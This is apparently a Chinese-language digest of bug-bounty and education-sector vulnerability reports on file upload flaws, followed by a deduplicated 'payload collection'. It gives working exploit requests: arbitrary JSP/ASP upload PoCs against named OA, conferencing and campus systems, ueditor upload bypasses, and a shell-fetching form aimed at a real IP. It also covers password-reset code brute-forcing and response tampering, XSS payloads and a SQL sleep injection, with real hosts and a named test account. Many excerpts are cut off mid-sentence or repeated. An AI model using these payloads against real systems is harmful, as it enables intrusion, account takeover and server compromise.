# SRC 实战报告提炼 — file_upload

> 来源：蚂蚁SRC榜一Clown的 39 份实战报告
> 提取时间：2026-09-14

## 典型案例摘要（20 份）

### 对一次登陆系统的漏洞挖掘

基本情况 首先，该系统为一个登录系统，本人尝试了爆破，并没有发现弱口令的问题 然后就开始查看源代码，也就是通过源代码，从而拿下了系统权限 测试过程 首先，登录系统长这鸟样 指纹信息如下： 测试爆破无果，转而查看源代码，发现一处dom xss DOM XSS 看到一个upload的函数，然后是一个地址 我将这个地址打开后，界面如下 继续查看源代码 通过 Util.getWinParam().dialogArguments.flag 取得参数赋值给flag，然后调用一下试试 他把flag的值传给了flag2，然后漏洞就产生了 我们只要把参数值改为 a';alert(1)// 就能触发这个xss 截

### 逻辑漏洞--任意密码重置

19.02.06丨星期三丨晴天 第一种：验证码可爆破 标志为验证码为4/5位纯数字，以及验证码为前端进行刷新（该情况最为常见，一般在补天专属都是高危的） 案列：当当网任意用户密码修改漏洞 http://m.dangdang.com/forget_psd.php?sid=e14aa9b65e0f4d05 输入要更新帐号的手机号码，然后提交。 下一步，对验证码进行暴破，由于验证码只4位。。网速乐观的情况下，数分钟就能破解出来。 也不多说了，经测试，成功破解了数个帐号。 POST /verify_fp.php?sid=e88bf0a11d2e7920 HTTP/1.1 Host: m.dangdan

### 文件上传html嵌套xss语句

文件上传html嵌套xss语句 0x01漏洞描述 在我们文件上传的时候很有很可能会遇见无法上传马子的情况，我相信很多人在这个时候都会直接不管这一个上传点，然后在企业src里面这样的上传点可以试试上传一个html文件配合xss语句，导致一个挂黑页弹窗的危害，在众测里面达到了中危的标准 0x02.漏洞测试工具： Burp  html配合xss语句的文件 <!DOCTYPE html> <html> 	<head> 		<title></title> 		<meta charset="utf-8"> 		<script type="text/javascript"> 			alert("testxs

### 第六更——查找目标与逻辑漏洞 (1)

查找目标 从已知文库寻找目标：    目前常见文库： peiqi文库（不需要邀请码），零组文库和白泽文库（需要邀请码） 此次选择peiqi文库：http://wiki.peiqi.tech/    由于我之前是挖edusrc,所以我在打击目标的时候，都是找关于学校的web系统于是开始寻找目标： 找web应用，然后查看关于学校应用的系统漏洞，并获取fofa关键词，自己再去进行漏洞挖掘（ 一般出现过的漏洞系统，肯定不止一个存在漏洞，每个人的思路不一样，所挖掘到的漏洞就不一样） 对fofa关键词查看，自己通过已知漏洞去获取对自己有用的资源（比如任意漏洞下载我们就可以通过这个获取web系统的源码，下一

### xss报告2

首先让你进行机构的基本信息填写，存在文件上传。 随便选择一个图片点击上传。抓包。发现文件名后缀为空，看返回包中显示的是上传的png格式，我们把 filename后面加上 html后缀，并且插入xss语句：<sCript>alert(1)</scriPt>;，放包。 成功造成储存xss.

### 华南农业大学 _ 教育行业漏洞报告平台

网址：https://scau.mycospxk.com/index.html?v=2.40.1.1#/user/login   找回密码地址：https://scau.mycospxk.com/index.html?v=2.40.1.1#/user/forget-password 打开找回密码地址 测试账号 201920110418 罗晓滨 先抓包然后点击下一步 修改返回包 现在的返回包为：  {"Value":{"IsSuccess":true,"Message":"验证通 过","FieldName":"","Tel":"","Email":"291****<EMAIL-REDACTED>"},"R

### 文件上传html嵌套xss语句

文件上传html嵌套xss语句 0x01漏洞描述 在我们文件上传的时候很有很可能会遇见无法上传马子的情况，我相信很多人在这个时候都会直接不管这一个上传点，然后在企业src里面这样的上传点可以试试上传一个html文件配合xss语句，导致一个挂黑页弹窗的危害，在众测里面达到了中危的标准 0x02.漏洞测试工具： Burp  html配合xss语句的文件 <!DOCTYPE html> <html> 	<head> 		<title></title> 		<meta charset="utf-8"> 		<script type="text/javascript"> 			alert("testxs

### EDU宝典

前言：本文所有漏洞均已在 2022 年 8 月份前提交，当然为了观赏性，刨去了弱口令，扫描 器扫到的注入以及一些垃圾洞之后写下的本文，我本身也不咋刷 edu 的，也就今年简单的 刷了一点 rank 分，写这篇文章也是巩固一下自己的知识并且告诉大家如何挖到通杀~  （全文自己手打，所以肯定会有错，如果发现错误请及时联系本人~）      其实信息收集大部分文章都说的差不多了，来来回回炒那些冷饭也没意思，无非就是 fofa， hunter，然后查下 title=”后台”或者就是 oa，cms 的 1daynday 去打，要么就是 oneforall+子 域名挖掘机找下子域名进行收集    这里说一

### 清华大学 教育漏洞报告平台

清华大学 时间 单位 作者 等级Rank 2022-07-05 20:37:26 清华大学 (/list/firm/3110) Blame深夜深夜看看 (/profile/8493/) 低危 1 无描述... 漏洞网站: http://cicm.pbcsf.tsinghua.edu.cn (http://cicm.pbcsf.tsinghua.edu.cn) http://mis.sem.tsinghua.edu.cn 漏洞描述: 网站未对编辑器上传接口做鉴权处理，构造数据包即可绕过服务器上传xss文件， 未鉴权接口1:http://cicm.pbcsf.tsinghua.edu.cn/ued

### xss漏洞

首先让你进行机构的基本信息填写，存在文件上传。 随便选择一个图片点击上传。抓包。发现文件名后缀为空，看返回包中显示的是上传的png格式，我们把 filename后面加上 html后缀，并且插入xss语句：<sCript>alert(1)</scriPt>;，放包。 成功造成储存xss.

### 文件上传html嵌套xss语句(1)

文件上传html嵌套xss语句 0x01漏洞描述 在我们文件上传的时候很有很可能会遇见无法上传马子的情况，我相信很多人在这个时候都会直接不管这一个上传点，然后在企业src里面这样的上传点可以试试上传一个html文件配合xss语句，导致一个挂黑页弹窗的危害，在众测里面达到了中危的标准 0x02.漏洞测试工具： Burp  html配合xss语句的文件 <!DOCTYPE html> <html> 	<head> 		<title></title> 		<meta charset="utf-8"> 		<script type="text/javascript"> 			alert("testxs

### 湘潭医卫职业技术学院 get shell 教育漏洞报告平台

湘潭医卫职业技术学院 get shell 时间 单位 开发商 作者 等级Rank 2022-10-05 19:28:59 湘潭医卫职业技术学院 (/list /firm/6881) 海南翼智慧信息科技有限公司 (/list /company/315) Blame_深夜深夜看看 (/profile/8493/) 严重 9 无描述... 海南翼智慧AIC智慧校园系统第三处文件上传getshell，AIC智慧校园系统第三处文件上传getshell 这里同时打包一些接口未授权和弱口令，就不单独交这些了，希望审核给个高分，谢谢啦 漏洞1：任意文件上传点: 漏洞描述:AIC学生管理系统， 核心业务使用ue

### 华智慧园区文件上传RCE.poc

﻿# 华智慧园区文件上传RCE  > 更新时间：2023-12-04  > 漏洞编号：  > 漏洞说明：  > 漏洞特征：  > 验证脚本：HTTP  ``` POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1 Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT  --A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT Content-Disposition: form-data; name="upload"; 

### 南京博纳睿通软件

Hunter：web.body="frameworkModuleJob"    资产一：http://fxry.yyhq365.cn/loginController.do?login    Poc    POST /ajaxinvoke/frameworkModuleJob.processApkUpload.upload HTTP/1.1  Host: fxry.yyhq365.cn  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_ 7) AppleWebKit/537.36 (KHTML, like  Gecko) Chro

### 联达OA

Fofa：app=”联达 OA”    Poc：  上传文件：  POST /Hosp_Portal/uploadLogo.aspx HTTP/1.1  Host:       User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_ 5) AppleWebKit/537.36 (KHTML, like  Gecko) Chrome/76.0.3809.132 Safari/537.36  Content-Type: multipart/form-data; boundary=00content0boundary00    --00co

### 好视通云会议 upLoad2.jsp 任意文件上传漏洞.poc

﻿# 好视通云会议 upLoad2.jsp 任意文件上传漏洞  > 更新时间：2023-12-07  > 漏洞编号：  > 漏洞说明： 好视通云会议/fm/systemConfig/upLoad2.jsp接口处存在任意文件上传漏洞，未经身份认证的攻击者可以通过此漏洞上传恶意后门文件，最终可获取服务器权限。  > 漏洞特征：app:"好视通-云会议"  > 验证脚本：HTTP  ``` POST /fm/systemConfig/upLoad2.jsp HTTP/1.1 Content-Type: multipart/form-data; boundary=1515df1sdfdsfddfs A

### 四川铁道职业学院

UEDITOR 文件上传漏洞      <form  action="http://223.85.242.50:8083//ueditor/net/Controller.ashx ?action=catchimage&encod e=utf-8" enctype="application/x-www-form-urlencoded" method ="POST">  <p>shell addr:<input type="text" name="source[]" /></p >  <input type="submit" value="Submit" />  </form>      http

### 湘潭医卫职业技术学院 get shell 教育漏洞报告平台 (1)

湘潭医卫职业技术学院 时间 单位 开发商 作者 等级 湘潭医卫职业技术学院 海南翼智慧信息科技有限公司 深夜深夜看看 严重 无描述 海南翼智慧AIC智慧校园系统第三处文件上传 getshell，AIC智慧校园系统第三处文件上传 getshell 这里同时打包一些接口未授权和弱口令，就不单独交这些了，希望审核给个高分，谢谢啦 漏洞1：任意文件上传点: 漏洞描述:AIC学生管理系统，  核心业务使用ueditor编辑器，同时本身又是aspx站点， .net存在任意文件上传，绕过文件格式的限制，在获取远程资源的时候并没有对远程文件的格式进行严格的过滤与判断。 AIC系统 : 湘潭医卫职业技术学院 教

### 华南农业大学 _ 教育行业漏洞报告平台 (1)

网址：https://scau.mycospxk.com/index.html?v=2.40.1.1#/user/login   找回密码地址：https://scau.mycospxk.com/index.html?v=2.40.1.1#/user/forget-password 打开找回密码地址 测试账号 201920110418 罗晓滨 先抓包然后点击下一步 修改返回包 现在的返回包为：  {"Value":{"IsSuccess":true,"Message":"验证通 过","FieldName":"","Tel":"","Email":"291****<EMAIL-REDACTED>"},"R

### 清华大学 教育漏洞报告平台 (1)

清华大学 时间 单位 作者 等级 Rank 2022-07-05 20:37:26 清华大学 (/list/firm/3110) Blame 深夜深夜看看 (/profile/8493/) 低危 1 无描述... 漏洞网站: http://cicm.pbcsf.tsinghua.edu.cn (http://cicm.pbcsf.tsinghua.edu.cn) http://mis.sem.tsinghua.edu.cn 漏洞描述: 网站未对编辑器上传接口做鉴权处理，构造数据包即可绕过服务器上传 xss文件， 未鉴权接口1:http://cicm.pbcsf.tsinghua.edu.cn/

## 实战 Payload 集（13 条去重）

### HTTP请求

```
POST /verify_fp.php?sid=e88bf0a11d2e7920 HTTP/1.1
Host: m.dangdang.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://m.dangdang.com/verify_fp.php?sid=e88bf0a11d2e7920
Content-Type: application/x-www-form-urlencoded
action=verify&sid=e88bf0a11d2e7920&mobile=xxxx&verify=§v§&submit=%E6%8
POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1 
Host: xxxx 
Content-Type: multipart/form -data; boundary= ----
WebKitFormBoundarymVk33liI64J7GQaK 
Content-Length: 368 
------WebKitFormBoundarymVk33liI64J7GQaK 
Content-Disposition: form-data; name="secId" 
1 
------WebKitFormBoundarymVk33liI64J7GQaK 
Content-Disposition: form-data; name="Filedata"; filename="hello.txt" 
Hello World！ 
------WebKitFormBoundarymVk33liI64J7GQaK 
Content-Disposition: form-data; name="plandetailid" 
1 
------W
POST /ueditor/php/controller.php?action=uploadfile HTTP/1.1
Host: cicm.pbcsf.tsinghua.edu.cn
Content-Length: 366
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://guanli.sanyau.edu.cn
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7AxXraLSPRmXLA1m
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.424
0.198 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/
POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
POST /ajaxinvoke/frameworkModuleJob.processApkUpload.upload HTTP/1.1 
Host: fxry.yyhq365.cn 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_ 7) AppleWebKit/537.36 (KHTML, like 
Gecko) Chrome/94.0.0.0 Safari/537.36 
Accept-Encoding: gzip, deflate 
Accept: */* 
Connection: close 
Content-Length: 227 
 
------WebKitFormBoundaryN5Novghl 
Content-Disposition: form-data; name="Filedata"; filename="test.jsp" 
Content-Type: application/octet-stream 
 
fcmit.cc
&lt;% out.println("Hello World！")
POST /Hosp_Portal/uploadLogo.aspx HTTP/1.1 
Host:      
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_ 5) AppleWebKit/537.36 (KHTML, like 
Gecko) Chrome/76.0.3809.132 Safari/537.36 
Content-Type: multipart/form-data; boundary=00content0boundary00 
 
--00content0boundary00 
Content-Disposition: form-data; name="DesignId" 
 
1 
--00content0boundary00 
Content-Disposition: form-data; name="Filedata"; filename="tt_test.asp" 
Content-Type: image/png 
 
tttest 
--00content0boundary00-- 
访问文
POST /Hosp_Portal/uploadLogo.aspx HTTP/1.1 
Host: 39.164.72.92:38080   
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_ 5) AppleWebKit/537.36 (KHTML, like 
Gecko) Chrome/76.0.3809.132 Safari/537.36 
Content-Type: multipart/form-data; boundary=00content0boundary00 
Content-Length: 234 
 
--00content0boundary00 
Content-Disposition: form-data; name="DesignId" 
 
1 
--00content0boundary00 
Content-Disposition: form-data; name="Filedata"; filename="tt_test.asp" 
Content-Type: image/png 
 

POST /fm/systemConfig/upLoad2.jsp HTTP/1.1
Content-Type: multipart/form-data; boundary=1515df1sdfdsfddfs
Accept-Encoding: gzip
 
--1515df1sdfdsfddfs
Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
Content-Type: application/octet-stream
 
<% out.print("dudesuite"); %>
--1515df1sdfdsfddfs--
```
```

### XSS

```
onsubmit='return
<sCript>alert(1)</scriPt>
<sCriPt>alert(/xss/)</sCriPt>
```

### curl

```
curl 语句（工具地址 https://github.com/vulhub/Apereo-CAS-Attack/releases/tag/v1.0.0） 
```

### SQL

```
sleep(2)))pcfy)+/ /a
```

## 技术手法统计

- WAF/过滤绕过: 6 次
- 提权: 5 次
- 漏洞利用: 4 次
- 接口发现: 2 次
- 参数篡改: 1 次

